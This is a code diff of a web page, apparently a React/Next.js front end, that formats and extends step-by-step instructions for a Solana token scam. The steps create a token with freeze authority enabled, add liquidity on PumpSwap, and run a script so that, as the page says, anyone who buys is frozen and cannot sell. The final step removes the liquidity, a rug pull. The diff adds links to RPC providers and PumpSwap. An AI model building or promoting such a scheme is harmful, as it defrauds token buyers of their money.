@@ -130,8 +130,9 @@ export default function Home() {
               </div>
             </li>
 
-                        <li>
-              Run this code to generate a private key and wallet address pair (or use existing private key from Phantom)
+            <li>
+              Run this code to generate a private key and wallet address pair
+              (or use existing private key from Phantom)
               <div className="rounded-xl border border-gray-800 bg-[#111]/60 shadow-lg backdrop-blur-lg hover:border-blue-600 transition mt-5">
                 <div className="flex justify-between items-center px-4 py-3 border-b border-gray-800">
                   <span className="font-semibold text-gray-100">Terminal</span>
@@ -145,40 +146,61 @@ export default function Home() {
               </div>
             </li>
 
-                        <li>
-              Paste the Private Key in 'config.js' file
-            </li>
+            <li>Paste the Private Key in 'config.js' file</li>
+
+            <li>Import the Wallet to Phantom and Fund it with SOL</li>
 
             <li>
-              Import the Wallet to Phantom and Fund it with SOL
-            </li>
-
-            <li>
-              Create a Token with that wallet WITH Freeze Authority Enabled <br />
+              Create a Token with that wallet WITH Freeze Authority Enabled{" "}
+              <br />
               You can keep the Mint Authority Disabled.
             </li>
-                                        <li>
-              Paste the Mint Address in 'config.js' file
+            <li>Paste the Mint Address in 'config.js' file</li>
+
+            <li>
+              Get an RPC endpoint from Helius or Alchemy and paste it into
+              'config.js'
+              <div className="flex flex-wrap gap-3 mt-4">
+                <a
+                  href="https://www.helius.dev/"
+                  target="_blank"
+                  className="px-5 py-2 bg-blue-600 hover:bg-blue-700 transition text-white font-medium rounded-lg shadow-md"
+                >
+                  Helius
+                </a>
+                <a
+                  href="https://www.alchemy.com/"
+                  target="_blank"
+                  className="px-5 py-2 bg-blue-600 hover:bg-blue-700 transition text-white font-medium rounded-lg shadow-md"
+                >
+                  Alchemy
+                </a>
+              </div>
             </li>
 
-                            <li>
-              Get an RPC endpoint from Helius or Alchemy and paste it into 'config.js'
+            <li>
+              Go to PumpSwap and Add Liquidity to your token.
+              <div className="flex flex-wrap gap-3 mt-4">
+                <a
+                  href="https://swap.pump.fun/deposit"
+                  target="_blank"
+                  className="px-5 py-2 bg-blue-600 hover:bg-blue-700 transition text-white font-medium rounded-lg shadow-md"
+                >
+                  PumpSwap
+                </a>
+              </div>
             </li>
 
-                                            <li>
-                Go to PumpSwap and Add Liquidity to your token.
+            <li>
+              Copy the Pump Fun Holer Wallet and paste it into 'config.js'{" "}
+              <br /> <br />
+              'config.js' is now fully configured
             </li>
 
-
-                                            <li>
-                Copy the Pump Fun Authority and paste it into 'config.js' <br /> <br />
-                'config.js' is now fully configured
-            </li>
-
-                                            <li>
-                Now start running the script. 
-                Anyone who buys the token will be frozen immediately and won't be able to sell.
-                              <div className="rounded-xl border border-gray-800 bg-[#111]/60 shadow-lg backdrop-blur-lg hover:border-blue-600 transition mt-5">
+            <li>
+              Now start running the script. Anyone who buys the token will be
+              frozen immediately and won't be able to sell.
+              <div className="rounded-xl border border-gray-800 bg-[#111]/60 shadow-lg backdrop-blur-lg hover:border-blue-600 transition mt-5">
                 <div className="flex justify-between items-center px-4 py-3 border-b border-gray-800">
                   <span className="font-semibold text-gray-100">Terminal</span>
                 </div>
@@ -191,11 +213,16 @@ export default function Home() {
               </div>
             </li>
 
-                                            <li>
-                Remove the Liquidity on PumpSwap.
-            </li>
-
-
+            <li>Remove the Liquidity on PumpSwap.</li>
+            <div className="flex flex-wrap gap-3 mt-4">
+              <a
+                href="https://swap.pump.fun/deposit"
+                target="_blank"
+                className="px-5 py-2 bg-blue-600 hover:bg-blue-700 transition text-white font-medium rounded-lg shadow-md"
+              >
+                PumpSwap
+              </a>
+            </div>
           </ol>
         </section>
       </main>
